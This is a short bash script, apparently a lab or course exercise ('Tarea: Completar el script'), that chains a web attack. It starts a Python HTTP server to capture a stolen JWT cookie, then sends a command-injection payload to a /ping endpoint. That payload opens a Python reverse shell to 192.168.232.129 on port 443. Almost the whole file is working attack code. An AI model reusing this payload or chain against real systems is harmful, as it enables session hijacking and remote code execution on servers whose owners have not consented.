#!/bin/bash

# Tarea: Completar el script

rm salida

bash -c "timeout 10 python3 -m http.server 8000" 2&> salida

cookie=$(cat salida | awk '{print $7}' | sed 's/\/?cookie=//g' | head -n 1 | sed 's/JWT_token=//g')


url_rce="http://172.17.0.2:5000/ping"

payload="127.0.0.1; python3 -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.232.129\",443));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'"

curl -s $url_rce -H "Cookie: JWT_token=$cookie" -d "ip=$payload"
